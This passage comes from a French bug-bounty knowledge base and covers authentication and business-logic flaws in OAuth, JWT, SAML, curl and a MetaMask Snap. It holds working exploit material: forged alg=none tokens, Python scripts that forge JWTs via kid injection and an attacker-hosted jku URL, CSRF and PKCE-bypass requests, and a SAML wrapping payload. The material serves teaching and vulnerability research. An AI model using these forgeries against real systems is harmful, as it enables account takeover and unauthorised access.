> GET /svcB HTTP/1.1
> Host: 127.0.0.1:18080
(no Authorization header sent for svcB at all)
SVC_B_REUSED_AUTH_FROM_A   <- server processed svcB under svcA's auth context

Control (fresh process, svcB requested alone) -- correct behavior for comparison:
LD_PRELOAD=/tmp/libpoc_gss_service_reuse.so POC_GSS_CREDS=NTLM_Alice \
/tmp/curl-8.20.0/src/curl -sv --noproxy '*' --negotiate --service-name svcB http://127.0.0.1:18080/svcB
> Authorization: Negotiate ...
SVC_B_FRESH_AUTH

Root cause: HTTP Negotiate connection-reuse matching in lib/url.c does not include the service principal name (CURLOPT_SERVICE_NAME/--service-name) as part of the authenticated-connection identity -- incomplete-fix variant of CVE-2026-5545 (which fixed reuse across different HOSTS but not across different SERVICE PRINCIPALS on the same host).
```

**Techniques :** connection-reuse-abuse, auth-context-confusion, gss-api-interposition, differential-testing

**Correspond aux classes qualifiantes :** auth-bypass

**Signal (endpoints/fonctions observés) :**
- `lib/http_negotiate.c`
- `lib/url.c`

**Paramètres impliqués :** `CURLOPT_SERVICE_NAME`, `--service-name`, `--negotiate`

---

### Taskcluster Web-Server OAuth2 Authorization Codes Are Reusable and the Exchange Handler Checks the Wrong Expiry Column

**📄 Cas réel**
[source](https://hackerone.com/reports/3734676)

Taskcluster web-server's OAuth2 token-exchange handler validates redirect_uri and code existence and mints a bridge access token, but never deletes/consumes the authorization_codes row, violating RFC 6749's single-use requirement. Separately, the expiry check reads the wrong database column (the requested credential lifetime, up to 1 year) instead of the code's actual 10-minute lifetime, so expired codes remain usable until a daily cleanup cron deletes them. An end-to-end PoC confirms a single authorization code can be exchanged twice for two different valid tokens.

**Cause racine :** The token-exchange handler does not consume (delete) the authorization code after use and checks the client's requested-credential-lifetime column instead of the authorization code's own short expiry column.

**Preuve technique (verbatim depuis la source) :**

```
Two bugs, both in services/web-server/src/servers/oauth2.js:165-199:
(1) exchange handler validates redirect_uri + code existence, mints a bridge token, RETURNS -- never deletes the authorization_codes row (violates RFC 6749 4.1.2 single-use requirement).
(2) expiry check reads entry.client_details.expires (the REQUESTED credential lifetime, up to 1 year per maxExpires) instead of the code's own 10-minute row, entry.expires (set at line 33 via taskcluster.fromNow('10 minutes')). Expired codes stay usable until the daily cleanup-expire-auth-codes cron runs. Same wrong-column bug repeats in /login/oauth/credentials at oauth2.js:318-375.

End-to-end PoC (Mocha test against unmodified Taskcluster @ commit 246cb765672da1fdc1b7e6901002725bf0e50090):
TEST_DB_URL=postgresql://postgres@localhost:5432/taskcluster-test NODE_ENV=test yarn mocha --grep "TC-002" test/third_party_test.js
-> "TC-002 (PoC): authorization code is reusable in violation of RFC 6749 §4.1.2" -- 1 passing
Test flow: authorize via GET /login/oauth/authorize -> exchange via POST /login/oauth/token (200, token A) -> REPLAY same code via POST /login/oauth/token (200, token B, token A != token B) -> GET /login/oauth/credentials with Bearer token B -> 200, full Taskcluster credentials in the ORIGINAL user's identity (for firefox-ci-tc.services.mozilla.com, that means Firefox-CI build-privileged scopes).

Suggested atomic-consume fix:
DELETE FROM authorization_codes WHERE code = code_in AND client_id = client_id_in AND redirect_uri = redirect_uri_in AND expires > now() RETURNING code, client_id, redirect_uri, identity, identity_provider_id, expires, client_details;
```

**Techniques :** authorization-code-replay, wrong-expiry-column-check, missing-single-use-consumption, rfc6749-violation

**Correspond aux classes qualifiantes :** oauth, auth-bypass, account-takeover

**Signal (endpoints/fonctions observés) :**
- `GET /login/oauth/authorize`
- `POST /login/oauth/token`
- `GET /login/oauth/credentials`

**Paramètres impliqués :** `code`, `redirect_uri`, `client_id`

---

### JWT alg=none — supprimer la signature en changeant l'algorithme déclaré

**🧾 Cheatsheet**
sévérité : critical · CWE-347

Certaines bibliothèques JWT (mal configurées ou anciennes) font confiance à l'en-tête `alg` du token pour décider COMMENT vérifier la signature. En changeant `alg` en `none` (valeur légale de la RFC 7519 pour un JWT non signé) et en supprimant la signature, certaines implémentations sautent purement et simplement la vérification -- acceptant un token dont on contrôle TOUT le contenu, y compris `role: admin` ou `user_id` arbitraire.

**Cause racine :** La bibliothèque de vérification JWT côté serveur détermine l'algorithme de vérification à partir du champ `alg` du token lui-même plutôt que d'imposer un algorithme fixe attendu côté serveur.

**Preuve technique (verbatim depuis la source) :**

```
Token original (header décodé : {"alg":"HS256","typ":"JWT"}) :
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0.SIGNATURE_HERE

Token forgé (header modifié en base64url de {"alg":"none","typ":"JWT"}, payload modifié avec role:admin, signature VIDE -- noter le point final sans rien après) :
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiJ9.

Envoyé tel quel :
GET /api/admin/users HTTP/1.1
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiJ9.

Outil dédié : jwt_tool.py -X a (mode alg=none automatique, teste aussi None, NONE, nOnE pour la casse).
```

**Techniques :** jwt-alg-none, signature-verification-bypass

**Correspond aux classes qualifiantes :** jwt, auth-bypass

**Paramètres impliqués :** `Authorization`

---

### JWT alg confusion RS256->HS256 : forger un token avec la clé publique comme secret HMAC

**🧾 Cheatsheet**
sévérité : critical · CWE-347

Un serveur qui accepte les tokens RS256 (signature asymétrique, vérifiée avec la clé PUBLIQUE) et supporte AUSSI HS256 (signature symétrique HMAC, où la même clé sert à signer et vérifier) peut être piégé : si on force `alg: HS256` sur un token et qu'on le signe avec HMAC en utilisant la clé PUBLIQUE RSA (récupérable via `/jwks.json` ou un endpoint de découverte OIDC) comme SECRET HMAC, le serveur -- qui appelle sa fonction de vérification HS256 avec 'la clé qu'il a pour ce kid', c'est-à-dire la clé publique -- valide le token comme authentique, alors qu'on l'a signé nous-mêmes avec une clé publiquement connue.

**Cause racine :** Le serveur utilise la même clé configurée (la clé publique RSA) indifféremment comme clé de vérification RS256 (asymétrique, correct) ou comme secret HS256 (symétrique, incorrect) selon l'algorithme déclaré dans le token, sans imposer un algorithme fixe attendu par type de clé.

**Preuve technique (verbatim depuis la source) :**

```
Étape 1 -- récupérer la clé publique du serveur :
curl https://auth.example.com/.well-known/jwks.json
# ou directement le certificat X.509/PEM si exposé ailleurs

Étape 2 -- forger le token en Python (PyJWT), en convertissant la clé publique PEM en secret HMAC :
import jwt
public_key_pem = open('server_public.pem').read()  # récupérée à l'étape 1
payload = {"user_id": 1, "role": "admin"}
forged_token = jwt.encode(payload, public_key_pem, algorithm="HS256")
print(forged_token)

Étape 3 -- envoyer le token forgé :
Authorization: Bearer <forged_token>

Outil dédié : jwt_tool.py -X k -pk server_public.pem (mode confusion d'algorithme automatisé).
```

**Techniques :** jwt-algorithm-confusion, rsa-public-key-as-hmac-secret

**Correspond aux classes qualifiantes :** jwt, auth-bypass

**Paramètres impliqués :** `Authorization`

---

### Injection SQL/path traversal via le champ kid (Key ID) de l'en-tête JWT

**🧾 Cheatsheet**
sévérité : critical · CWE-89

Le champ `kid` (Key ID) de l'en-tête JWT indique au serveur QUELLE clé utiliser pour vérifier la signature, souvent en le passant tel quel dans un chemin de fichier (`/keys/{kid}.pem`) ou une requête SQL (`SELECT key FROM keys WHERE id = '{kid}'`). Si `kid` n'est pas validé, on peut y injecter un path traversal (pointer vers un fichier connu et prévisible dont on connaît le contenu, ex: `/dev/null` qui se lit comme une chaîne vide -- puis signer le token avec HMAC clé vide) ou une injection SQL (forcer la requête à retourner une valeur qu'on choisit comme 'clé', qu'on utilise ensuite pour signer).

**Cause racine :** La valeur du champ `kid`, entièrement contrôlée par le client dans l'en-tête JWT non signé, est utilisée sans validation/sanitisation pour construire un chemin de fichier ou une requête de base de données servant à récupérer la clé de vérification.

**Preuve technique (verbatim depuis la source) :**

```
Variante path traversal (kid pointant vers /dev/null, clé de vérification = chaîne vide) :
Header forgé : {"alg":"HS256","kid":"../../../../dev/null","typ":"JWT"}
Signature calculée avec HMAC-SHA256 et une clé VIDE (b"") :
import jwt
token = jwt.encode({"user_id":1,"role":"admin"}, key="", algorithm="HS256", headers={"kid":"../../../../dev/null"})

Variante injection SQL (si `kid` alimente `SELECT secret FROM keys WHERE id='{kid}'`) -- injecter un UNION qui retourne une valeur connue comme secret :
kid_payload = "x' UNION SELECT 'attacker_known_secret'-- -"
# Header : {"alg":"HS256","kid":"x' UNION SELECT 'attacker_known_secret'-- -","typ":"JWT"}
# Le serveur exécute la requête empoisonnée, récupère 'attacker_known_secret' comme clé de vérif,
# on signe alors le token avec CETTE clé qu'on connaît -> signature validée.
token = jwt.encode({"role":"admin"}, key="attacker_known_secret", algorithm="HS256", headers={"kid": kid_payload})
```

**Techniques :** jwt-kid-injection, kid-path-traversal, kid-sql-injection

**Correspond aux classes qualifiantes :** jwt, sqli, path-traversal, auth-bypass

**Paramètres impliqués :** `Authorization`

---

### Faire pointer le serveur vers un jeu de clés attaquant via jku/x5u dans l'en-tête JWT

**🧾 Cheatsheet**
sévérité : critical · CWE-347

Les en-têtes optionnels `jku` (JWK Set URL) et `x5u` (X.509 URL) indiquent au serveur OÙ télécharger la clé publique à utiliser pour vérifier la signature -- une fonctionnalité légitime pour la fédération de clés multi-serveurs, mais dangereuse si le serveur fait confiance à N'IMPORTE QUELLE URL fournie dans le token lui-même sans allowlist de domaines de confiance. En hébergeant son propre jeu de clés JWKS et en signant le token avec sa propre clé privée correspondante, un attaquant fait valider n'importe quel token forgé comme authentique.

**Cause racine :** Le serveur récupère la clé de vérification depuis l'URL indiquée par le champ `jku`/`x5u` du token SANS vérifier que cette URL appartient à une liste de domaines de confiance pré-configurée.

**Preuve technique (verbatim depuis la source) :**

```
Étape 1 -- héberger un JWKS avec sa propre paire de clés (ex: via ngrok pour une URL publique rapide) :
openssl genrsa -out attacker_private.pem 2048
openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem
# Convertir attacker_public.pem au format JWKS (n, e en base64url) et servir sur https://attacker.ngrok.io/jwks.json

Étape 2 -- forger le token avec l'en-tête jku pointant vers ce JWKS :
import jwt
token = jwt.encode(
    {"user_id": 1, "role": "admin"},
    open("attacker_private.pem").read(),
    algorithm="RS256",
    headers={"jku": "https://attacker.ngrok.io/jwks.json", "kid": "attacker-key-1"}
)

Étape 3 -- envoyer : le serveur télécharge le JWKS depuis l'URL contrôlée par l'attaquant, y trouve la clé publique correspondante, et valide la signature.
Bonus reconnaissance : même si le bypass échoue, une requête sortante du serveur vers l'URL fournie confirme une SSRF exploitable (utile pour scanner l'infra interne via jku).
```

**Techniques :** jwt-jku-header-injection, jwt-x5u-header-injection, attacker-controlled-jwks

**Correspond aux classes qualifiantes :** jwt, auth-bypass, ssrf

**Paramètres impliqués :** `Authorization`

---

### Interception du code d'autorisation OAuth via un redirect_uri de sous-domaine oublié dans l'allowlist

**🧾 Cheatsheet**
sévérité : critical · CWE-601

Beaucoup de serveurs OAuth valident `redirect_uri` par simple correspondance de PRÉFIXE ou de SUFFIXE de domaine plutôt que par correspondance EXACTE de l'URI complète enregistrée. Si un sous-domaine oublié/legacy de l'application principale héberge du contenu contrôlable par l'attaquant (page de démo, ancien projet, bucket S3 mal configuré pointé par un CNAME du domaine), l'enregistrer comme `redirect_uri` fait rediriger le code d'autorisation OAuth (dans le fragment ou la query string) directement vers l'infrastructure de l'attaquant.

**Cause racine :** La validation du redirect_uri OAuth utilise une correspondance partielle (endsWith/startsWith/regex sur le domaine racine) au lieu d'une comparaison EXACTE avec la liste des URIs de callback réellement enregistrées pour ce client_id.

**Preuve technique (verbatim depuis la source) :**

```
URL d'autorisation malveillante, redirect_uri pointant vers un sous-domaine legacy compromis/repris (ex: un ancien bucket S3 dont le CNAME pointe encore vers app.example.com mais dont le contenu S3 a expiré et est réenregistrable) :
https://auth.example.com/oauth/authorize?response_type=code&client_id=web-app&redirect_uri=https://old-demo.example.com/callback&scope=profile&state=xyz

Si le serveur accepte ce redirect_uri parce qu'il finit par '.example.com', et que l'attaquant contrôle old-demo.example.com (repris via un service de sous-domaine expiré) : la victime authentifiée est redirigée vers ce domaine avec le code OAuth en paramètre :
https://old-demo.example.com/callback?code=AUTH_CODE_HERE&state=xyz
-- l'attaquant échange ensuite ce code contre un token d'accès via le endpoint /oauth/token avec le client_secret public (flow SPA) ou via son propre backend si le client_secret est requis mais que le flow est de type PKCE public.
```

**Techniques :** oauth-redirect-uri-subdomain-bypass, authorization-code-theft

**Correspond aux classes qualifiantes :** oauth, open-redirect, account-takeover

**Signal (endpoints/fonctions observés) :**
- `GET /oauth/authorize`

**Paramètres impliqués :** `redirect_uri`, `client_id`, `response_type`

---

### CSRF sur le flow OAuth (paramètre state absent/non vérifié) menant à une prise de compte via liaison forcée

**🧾 Cheatsheet**
sévérité : high · CWE-352

Le paramètre `state` du flow OAuth existe précisément pour lier la requête d'autorisation initiale à la réponse de callback (anti-CSRF). Si le serveur ne le génère/vérifie pas, un attaquant peut initier lui-même un flow OAuth avec SON PROPRE compte tiers (Google/GitHub), intercepter le code retourné pour LUI, puis faire visiter à la victime l'URL de callback avec CE code -- si l'application lie automatiquement le compte tiers authentifié au compte actuellement connecté de la victime (fonctionnalité 'lier mon compte Google'), le compte Google de l'ATTAQUANT se retrouve lié au compte de la VICTIME, permettant à l'attaquant de se connecter ensuite au compte victime via 'Se connecter avec Google'.

**Cause racine :** Le endpoint de callback OAuth ne vérifie pas que le paramètre `state` reçu correspond à celui généré et stocké en session lors de l'initiation du flow par CET utilisateur précis, permettant de rejouer une réponse de callback légitime pour l'attaquant dans le contexte de session d'une victime.

**Preuve technique (verbatim depuis la source) :**

```
Étape 1 -- attaquant initie normalement un flow OAuth avec SON compte Google et intercepte le code AVANT qu'il ne soit consommé (ex: intercepte la redirection dans Burp avant qu'elle n'atteigne son propre navigateur) :
https://accounts.google.com/o/oauth2/auth?client_id=...&redirect_uri=https://app.example.com/oauth/callback&response_type=code
# redirige vers : https://app.example.com/oauth/callback?code=ATTACKER_CODE (state absent ou ignoré)

Étape 2 -- l'attaquant piège la victime (déjà connectée à son compte app.example.com) pour visiter cette URL de callback avec le code de l'attaquant :
<img src="https://app.example.com/oauth/callback?code=ATTACKER_CODE" style="display:none">

Si l'app lie automatiquement le compte Google associé à ATTACKER_CODE au compte de session actuel (celui de la victime), l'attaquant peut désormais se connecter au compte victime via 'Se connecter avec Google'.
```

**Techniques :** oauth-csrf-login, account-linking-hijack

**Correspond aux classes qualifiantes :** oauth, csrf, account-takeover

**Signal (endpoints/fonctions observés) :**
- `GET /oauth/callback`

**Paramètres impliqués :** `state`, `code`

---

### Fuite d'un access_token OAuth implicit flow via l'en-tête Referer d'une ressource tierce

**🧾 Cheatsheet**
sévérité : high · CWE-598

Le flow OAuth Implicit (legacy, déconseillé depuis OAuth 2.1) retourne l'access_token directement dans le FRAGMENT de l'URL de callback (`#access_token=...`), normalement jamais envoyé au serveur ni dans l'en-tête Referer. Mais si la page de callback charge ensuite une ressource tierce (script analytics, image, police web) AVANT d'avoir extrait/nettoyé le fragment de `window.location`, certains navigateurs/redirections peuvent faire fuiter le token si le développeur a par erreur concaténé le fragment dans une query string relayée (bug fréquent : redirection post-login vers une autre page en réutilisant `window.location.href` complet au lieu de `window.location.pathname`).

**Cause racine :** Le développeur relaie ou log l'URL complète (`window.location.href`, incluant le fragment) vers un service tiers ou une redirection ultérieure, transformant accidentellement le fragment contenant le token en query string effectivement transmise au réseau.

**Preuve technique (verbatim depuis la source) :**

```
URL de callback typique du flow implicit :
https://app.example.com/oauth/callback#access_token=ya29.a0AfH6SMC...&token_type=Bearer&expires_in=3600

Code client vulnérable (bug réel courant, redirige en réutilisant location.href complet) :
// Après extraction du token pour le stocker, le développeur redirige ainsi par erreur :
window.location.href = '/dashboard?ref=' + window.location.href;
// -> nouvelle URL : /dashboard?ref=https://app.example.com/oauth/callback%23access_token=ya29...
// Le fragment devient partie de la QUERY STRING de la nouvelle URL -> envoyé dans Referer
// si /dashboard charge la moindre ressource tierce (Google Analytics, CDN de police, etc.)

Vérification : intercepter le trafic sortant vers des domaines tiers depuis /dashboard et chercher access_token dans l'en-tête Referer capturé côté attaquant (ex: sur son propre serveur de logs si l'attaquant contrôle une ressource incluse sur la page).
```

**Techniques :** implicit-flow-token-referer-leak, url-fragment-vs-query-confusion

**Correspond aux classes qualifiantes :** oauth, account-takeover

**Paramètres impliqués :** `access_token`

---

### SAML Signature Wrapping (XSW) — modifier l'identité affirmée sans invalider la signature

**🧾 Cheatsheet**
sévérité : critical · CWE-347

La signature XML d'une réponse SAML référence l'élément signé par son ID (`<Reference URI="#assertion-id">`), pas par sa POSITION dans le document. En dupliquant l'assertion signée légitime (déplacée ailleurs dans le XML, ex: dans un `<Extensions>`) et en insérant une NOUVELLE assertion forgée (non signée, avec une identité différente comme `admin@example.com`) à la place attendue par le parseur applicatif, certaines implémentations SAML vérifient la signature sur l'ancienne assertion (toujours présente, retrouvée par son ID de référence) mais TRAITENT LOGIQUEMENT la nouvelle assertion forgée -- un désaccord classique entre le composant de vérification de signature et le composant qui extrait les données métier.

**Cause racine :** Le composant de vérification de signature XML localise l'élément signé par son attribut de référence (ID), tandis que le composant qui extrait l'identité de l'utilisateur pour l'application utilise une recherche positionnelle/XPath différente dans l'arbre XML, permettant à ces deux vues de diverger sur QUELLE assertion est 'la' réponse SAML effective.

**Preuve technique (verbatim depuis la source) :**

```
Structure XML simplifiée d'une attaque XSW type 1 (l'assertion légitime signée est déplacée en tant qu'enfant d'une assertion forgée, qui devient la nouvelle racine que le parseur applicatif lit en premier) :
<samlp:Response>
  <saml:Assertion ID="evil-assertion">  <!-- NOUVELLE assertion forgée, LUE par l'application -->
    <saml:Subject><saml:NameID>admin@example.com</saml:NameID></saml:Subject>
    <saml:Assertion ID="original-assertion-id">  <!-- assertion LÉGITIME signée, déplacée ici -->
      <ds:Signature>...<Reference URI="#original-assertion-id">...</ds:Signature>
      <saml:Subject><saml:NameID>victim@example.com</saml:NameID></saml:Subject>
    </saml:Assertion>
  </saml:Assertion>
</samlp:Response>

Outil dédié : SAMLReQuest / samling (Burp extension) automatisent les 8 variantes connues de XSW (XSW1-XSW8) sur une réponse SAML capturée légitime.
```

**Techniques :** xml-signature-wrapping, saml-assertion-duplication

**Correspond aux classes qualifiantes :** auth-bypass, account-takeover

**Signal (endpoints/fonctions observés) :**
- `POST /saml/acs`

**Paramètres impliqués :** `SAMLResponse`

---

### Downgrade PKCE — rejouer un code d'autorisation sans code_verifier si le serveur ne l'exige pas

**🧾 Cheatsheet**
sévérité : high · CWE-287

PKCE (Proof Key for Code Exchange) protège les clients publics (SPA, mobile) sans client_secret contre l'interception du code d'autorisation, en exigeant que l'échange final présente un `code_verifier` correspondant au `code_challenge` envoyé initialement. Si le serveur d'autorisation traite PKCE comme OPTIONNEL (accepte l'échange même sans `code_verifier` quand le client ne l'envoie simplement pas), un attaquant qui a intercepté un code d'autorisation SANS jamais avoir vu le `code_verifier` original peut quand même l'échanger contre un token en omettant purement et simplement ce paramètre.

**Cause racine :** Le endpoint /oauth/token n'impose pas la présence et la validation de `code_verifier` pour les clients enregistrés avec PKCE, le traitant comme un paramètre optionnel plutôt qu'obligatoire dès lors qu'un `code_challenge` a été fourni à l'initiation.

**Preuve technique (verbatim depuis la source) :**

```
Requête d'échange SANS code_verifier, avec un code intercepté (ex: via un attaquant réseau sur mobile, ou un log applicatif exposé) :
POST /oauth/token HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=INTERCEPTED_CODE&client_id=mobile-app&redirect_uri=com.example.app://callback

Si la réponse retourne un access_token valide malgré l'absence de code_verifier (que le serveur aurait dû exiger et vérifier contre le code_challenge original en SHA256), la protection PKCE est contournable et le vol de code d'autorisation redevient exploitable comme avant l'introduction de PKCE.
```

**Techniques :** pkce-downgrade, code-verifier-optional-bypass

**Correspond aux classes qualifiantes :** oauth, account-takeover

**Signal (endpoints/fonctions observés) :**
- `POST /oauth/token`

**Paramètres impliqués :** `code`, `code_verifier`

---

### Contourner un filtre alg=none avec variation de casse (None, NONE, nOnE)

**🧾 Cheatsheet**
sévérité : high · CWE-347

Après la découverte massive de la vulnérabilité alg=none dans plusieurs bibliothèques JWT, certains correctifs/WAF ne bloquent que la chaîne EXACTE `"none"` (sensible à la casse) dans le champ `alg`, sans normaliser la comparaison. Certaines bibliothèques (notamment d'anciennes versions de node-jsonwebtoken et PyJWT) traitent `alg` de façon insensible à la casse en interne -- `None`, `NONE`, `nOnE` sont alors tous acceptés comme équivalents à 'pas de signature' malgré un filtre qui ne cherche que la chaîne lowercase exacte.

**Cause racine :** Le filtre de sécurité ajouté en correctif compare la valeur du champ `alg` de façon sensible à la casse (`if alg == "none"`) alors que la bibliothèque de vérification sous-jacente normalise en interne la valeur (`.lower()`) avant de décider du comportement de vérification, créant un écart exploitable.

**Preuve technique (verbatim depuis la source) :**

```
Header standard bloqué par le filtre :
{"alg":"none","typ":"JWT"}  -- rejeté

Variantes de casse à tester systématiquement (jwt_tool automatise ce brute-force de casse) :
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}
{"alg":"noNE","typ":"JWT"}

Encoder chaque variante en base64url, construire le token complet avec signature vide :
import base64, json
for variant in ['None', 'NONE', 'nOnE', 'noNE']:
    header = base64.urlsafe_b64encode(json.dumps({"alg":variant,"typ":"JWT"}).encode()).rstrip(b'=')
    payload = base64.urlsafe_b64encode(json.dumps({"role":"admin"}).encode()).rstrip(b'=')
    print(f"{header.decode()}.{payload.decode()}.")
```

**Techniques :** case-sensitivity-filter-bypass, jwt-alg-none-variant

**Correspond aux classes qualifiantes :** jwt, auth-bypass

**Paramètres impliqués :** `Authorization`

---

### Réutiliser un id_token OIDC émis pour une autre application (audience non vérifiée)

**🧾 Cheatsheet**
sévérité : high · CWE-287

Un id_token OIDC contient un champ `aud` (audience) qui identifie POUR QUELLE application (client_id) il a été émis. Si une application B ne vérifie pas que `aud` correspond bien à SON PROPRE client_id avant de faire confiance à l'identité affirmée dans le token, un id_token légitimement obtenu pour l'application A (par exemple via un site tiers moins sécurisé partageant le même fournisseur d'identité Google/Microsoft) peut être réutilisé pour se connecter à l'application B, tant que le token est signé par le même émetteur (`iss`) de confiance.

**Cause racine :** Le endpoint 'Se connecter avec Google/Microsoft' de l'application vérifie la signature et l'émetteur (`iss`) du id_token mais omet de vérifier que le champ `aud` correspond au client_id de CETTE application précise.

**Preuve technique (verbatim depuis la source) :**

```
id_token obtenu légitimement via un flow OAuth vers une autre application tierce partageant le même IdP (décodé, extrait de son propre localStorage/network tab après login sur ce tiers) :
{"iss":"https://accounts.google.com","aud":"OTHER_APP_CLIENT_ID.apps.googleusercontent.com","sub":"1234567890","email":"victim@example.com","email_verified":true,...}

Rejeu direct sur l'application cible sans jamais avoir authentifié via SON propre flow OAuth :
POST /auth/login-with-google HTTP/1.1
Host: target-app.example.com
Content-Type: application/json

{"id_token":"eyJhbGciOiJSUzI1NiIsImtpZCI6...<le token émis pour l'AUTRE app>"}

Si target-app.example.com authentifie l'utilisateur email_verified sans vérifier aud == son propre client_id, la connexion réussit avec l'identité du champ email/sub, alors que ce token n'a jamais été destiné à cette application.
```

**Techniques :** oidc-audience-validation-missing, cross-client-token-reuse

**Correspond aux classes qualifiantes :** oauth, auth-bypass, account-takeover

**Signal (endpoints/fonctions observés) :**
- `POST /auth/login-with-google`

**Paramètres impliqués :** `id_token`

---

### Abus du paramètre crit (critical) de l'en-tête JOSE pour forcer un traitement non sécurisé

**🧾 Cheatsheet**
sévérité : medium · CWE-347

Le paramètre d'en-tête `crit` (RFC 7515) liste des extensions personnalisées que le vérificateur DOIT comprendre et traiter, sous peine de rejeter le token. Certaines implémentations mal codées traitent une valeur `crit` inconnue en l'IGNORANT silencieusement plutôt qu'en rejetant le token (violation de la RFC), ouvrant la porte à des extensions personnalisées comme un faux paramètre `b64` (RFC 7797, contrôle si le payload est encodé en base64 avant signature) mal implémenté, qui peut désynchroniser ce que le vérificateur signe de ce que l'application lit comme payload.

**Cause racine :** Le vérificateur JWT ignore silencieusement les valeurs du tableau `crit` qu'il ne reconnaît pas au lieu de rejeter catégoriquement le token comme l'exige la RFC 7515 (§4.1.11), permettant d'injecter des directives de traitement non prévues.

**Preuve technique (verbatim depuis la source) :**

```
Header avec b64:false via crit (si supporté sans validation stricte, le payload n'est plus base64-encodé mais utilisé en clair dans le calcul de signature -- exploitable pour faire signer par le serveur un contenu arbitraire non-JSON en profitant d'un endpoint qui accepte de signer d'autres types de données) :
{"alg":"HS256","crit":["b64"],"b64":false,"typ":"JWT"}

Test de détection : envoyer un token avec un paramètre crit totalement inventé et vérifier si le serveur le rejette (comportement correct) ou l'accepte silencieusement (vulnérable, signal qu'une extension comme b64:false pourrait être exploitable) :
{"alg":"HS256","crit":["totallyMadeUpParam99"],"totallyMadeUpParam99":"anything","typ":"JWT"}
```

**Techniques :** jose-crit-header-abuse, custom-extension-parameter-injection

**Correspond aux classes qualifiantes :** jwt, auth-bypass

**Paramètres impliqués :** `Authorization`

---

## Business Logic Flaws

*14 cas.*

### Authorization Bypass in Starknet Snap via enableAuthorize parameter leads to unauthorized transaction signing

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3507241)

The Starknet Snap (a MetaMask extension) exposes a signMessage RPC handler that accepts a client-supplied boolean parameter enableAuthorize. When the calling website sets it to false, the confirmation UI that normally requires explicit user approval is skipped entirely, and the message/transaction is signed with the account's private key. A malicious website can therefore have arbitrary messages or transactions signed without any user interaction.

**Cause racine :** The user-consent check before signing was gated behind a caller-controlled parameter instead of being enforced unconditionally on the snap side.

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable handler (github.com/Consensys/starknet-snap, src/rpcs/sign-message.ts#L77):
protected async handleRequest(params: SignMessageParams): Promise<SignMessageResponse> {
  const { enableAuthorize, typedDataMessage, address } = params;
  if (
    // caller-controlled: set enableAuthorize=false to skip the confirm dialog
    enableAuthorize &&
    !(await renderSignMessageUI({ address, typedDataMessage, chainId: this.network.chainId }))
  ) {
    throw new UserRejectedOpError() as unknown as Error;
  }
  return await signMessageUtil(this.account.privateKey, typedDataMessage, address);
}
// note left in source: "TODO: enableAuthorize should set default to true"

Repro: malicious site calls the Snap's signMessage RPC with enableAuthorize:false in params -> no confirmation UI shown to the user -> message/transaction signed silently with the account's private key. PoC: local HTML page (exp-starknet.html) served on localhost:5555, calls start PoC -> signature appears with zero user approval step.
```

**Techniques :** parameter-tampering, client-controlled-flag, authorization-bypass

**Correspond aux classes qualifiantes :** auth-bypass

**Paramètres impliqués :** `enableAuthorize`, `typedDataMessage`, `address`

---

### Business Logic Bypass Allows Setting "Read Access" Role Without Pro Plan Subscription

**📄 Cas réel**
[source](https://hackerone.com/reports/3591764)

Generating a project invitation link sends a POST request carrying an access_level parameter (write/read), where read (Viewer) is supposed to be Pro-plan-only. By toggling an invite link's access from Edit to Disabled and back to Edit while intercepting traffic, the researcher caught the POST request and changed access_level from write to read; the server accepted it without checking the inviter's plan, letting a Free plan account generate and share a Viewer-role invite link.

**Cause racine :** The Pro-plan restriction on which access_level values a user may assign was enforced only in the client UI, not revalidated against the inviting user's subscription plan on the server.

**Preuve technique (verbatim depuis la source) :**

```
Raw request that flips the plan-gated field (captured mid-flow: toggle invite access Disabled -> Edit while intercepting, catch the resulting POST, edit access_level before forwarding):
POST /projects/Project-ID/magic-codes HTTP/2
Host: api.lovable.dev
Cookie: [Your-Cookie]
Authorization: Bearer [Your-Authorization-Header]
Content-Type: application/json
Content-Length: 23
Origin: https://lovable.dev

{"access_level":"read"}
-> response reflects "read" with no error; project's share panel now shows 'View access' despite the account being on the Free plan; invite link accepted by a second account, which lands with Viewer permission -- fully functional Pro-tier role on a Free account.
```

**Techniques :** parameter-tampering, request-interception, plan-restriction-bypass

**Correspond aux classes qualifiantes :** bfla, privilege-escalation

**Signal (endpoints/fonctions observés) :**
- `/projects/Project-ID/magic-codes`

**Paramètres impliqués :** `access_level`

---

### Business Logic Flaw Allowing Free Plan Users to Assign Restricted Roles

**📄 Cas réel**
[source](https://academy.logicalbreach.com/writeups/business-logic-flaw-allowing-free-plan-users-to-assign-restricted-roles-5813b01a)

Free plan users are only allowed to invite collaborators with the Editor role via the UI. Intercepting the invite request and changing the role parameter from editor to viewer was accepted by the server despite the Free plan. A second collaboration feature used a different parameter (access_level, write/read); analyzing the app's JS bundle revealed that read maps to the restricted Viewer role, and tampering it likewise succeeded on a Free plan.

**Cause racine :** Plan-based role entitlement checks for the role and access_level invitation parameters were enforced only client-side and not revalidated against the user's subscription plan on the backend.

**Preuve technique (verbatim depuis la source) :**

```
Case 1 -- invite endpoint, role parameter tampering (Free plan restricted to inviting Editor only):
intercept the normal 'invite as Editor' request -> find parameter role=editor -> change to role=viewer -> resend -> processed successfully, no error (restriction was UI-only).

Case 2 -- different endpoint/parameter for project collaboration (access_level), same class of bug but different accepted values -- discovered by reading the app's JS bundle instead of guessing:
JS analysis revealed access_level accepts: write (-> Editor role, allowed on Free) and read (-> Viewer role, meant to require Pro).
Set access_level=read on the Free-plan request -> processed successfully, no error -> invite link opened on a second account -> account added with Viewer role, confirming full bypass.
```

**Techniques :** parameter-tampering, client-side-restriction-bypass, js-source-analysis

**Correspond aux classes qualifiantes :** bfla, privilege-escalation

**Paramètres impliqués :** `role`, `access_level`

---

### Exploiting Business Logic: Inventory Depletion via Parameter Tampering

**📄 Cas réel**
